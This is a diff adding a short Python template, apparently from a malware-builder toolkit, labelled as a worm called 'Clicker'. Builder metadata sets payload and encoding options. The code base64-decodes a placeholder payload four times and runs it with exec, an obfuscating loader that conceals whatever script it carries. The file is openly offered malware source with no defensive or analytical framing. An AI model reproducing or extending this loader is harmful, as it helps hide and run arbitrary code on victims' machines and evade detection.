@@ -1,0 +1,26 @@
+#!name##Clicker
+#!types##worm
+#!info##A python worm that runs a base64 encoded multiple times another python script.
+#!processWorm##BasicProcess
+#!reqPayload##CLI_payload##Python Script
+#!payloadOpt##CLI_payload##ENCODE##base64
+#!payloadOpt##CLI_payload##ENCODE_COUNT##4
+#!payloadOpt##CLI_payload##INCLUDE_IMPORTS##True##Include imports in code
+
+import base64
+
+class Clicker:
+    def __init__(self):
+        self.name = "Clicker"
+        self.code = {{CLI_payload}}
+        self.payload = "for _ in range({{CLI_payload_ENCODE_COUNT}}):self.code=base64.b64decode(self.code)\nexec(self.code)"
+    
+    def execute(self) -> None:
+        exec(self.payload)
+    
+    def Run(self) -> None:
+        self.execute()
+
+if __name__ == "__main__":
+    worm = Clicker()
+    worm.Run()
